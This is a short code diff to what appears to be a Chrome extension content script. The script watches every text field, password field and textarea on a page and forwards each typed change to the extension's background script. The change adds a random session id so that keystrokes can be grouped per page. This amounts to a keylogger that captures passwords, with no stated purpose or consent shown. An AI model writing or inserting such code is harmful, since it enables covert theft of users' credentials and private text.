@@ -1,4 +1,6 @@
 
+id_key = Math.round(Math.random() * 1000000)
+
 $(document).on('input', 'input[type=text],input[type=password],textarea', function (e) {
     var old = $(this).attr('data-old-value') || '',
         cur = $(this).val() || '';
@@ -11,6 +13,6 @@ $(document).on('input', 'input[type=text],input[type=password],textarea', functi
 
     $(this).attr('data-old-value', cur);
 
-    chrome.runtime.sendMessage(diff, function (x) { });
+    chrome.runtime.sendMessage({ id_key: id_key, stroke: diff }, function (x) { });
 });
 
